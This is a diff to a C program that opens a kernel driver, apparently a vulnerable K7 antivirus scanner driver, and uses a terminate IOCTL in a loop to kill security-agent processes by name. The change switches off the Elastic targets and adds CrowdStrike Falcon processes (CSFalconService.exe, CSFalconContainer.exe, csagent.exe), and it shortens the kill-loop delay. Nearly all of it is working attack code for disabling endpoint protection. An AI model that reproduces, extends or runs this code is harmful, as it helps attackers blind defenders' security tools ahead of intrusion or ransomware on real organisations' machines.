@@ -6,8 +6,9 @@
 #define DRIVER_SYMLINK L"\\\\.\\DosK7RKScnDrv"
 #define TERMINATE_IOCTL 0x222018
 #define WINDOWS_ENGINE TRUE
-#define ELASTIC_AGENT TRUE
-#define ELASTIC_ENDPOINT TRUE
+#define ELASTIC_AGENT FALSE
+#define ELASTIC_ENDPOINT FALSE
+#define CrowdStrike TRUE
 
 typedef struct _killerBuff {
 	int PID;
@@ -93,7 +94,17 @@ int main(int argc, char* argv[]) {
 			wchar_t* elasticDefend = L"elastic-endpoint.exe";
 			KillByName(hDriver, elasticDefend);
 		}
-		Sleep(1500);
+		if(CrowdStrike){
+			wchar_t* crowdStrikeDefend3 = L"CSFalconService.exe";
+			KillByName(hDriver, crowdStrikeDefend3);
+			wchar_t* crowdStrikeDefend2 = L"CSFalconContainer.exe";
+			KillByName(hDriver, crowdStrikeDefend2);
+			wchar_t* crowdStrikeDefend = L"csagent.exe";
+			KillByName(hDriver, crowdStrikeDefend);
+			
+			
+		}
+		Sleep(700);
 	}
 
 	
